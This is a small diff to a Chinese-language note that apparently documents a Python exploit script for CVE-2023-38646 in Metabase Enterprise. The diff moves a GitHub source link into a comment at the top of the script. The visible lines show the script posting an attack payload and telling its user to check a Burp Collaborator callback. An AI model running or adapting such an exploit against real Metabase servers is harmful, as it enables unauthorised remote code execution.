@@ -13,6 +13,9 @@ Metabase Enterprise 1.43 < 1.43.7.2
 
 ## python脚本
 ```
+
+# https://github.com/0xrobiul/CVE-2023-38646
+
 import requests
 import argparse
 from colorama import Fore, Style
@@ -44,4 +47,4 @@ attk = requests.post(url, headers=headers, json=payload)
 print(Cyan + "Done!! Check Burp Colabrator!!" + STOP)
 ```
 
-https://github.com/0xrobiul/CVE-2023-38646
+
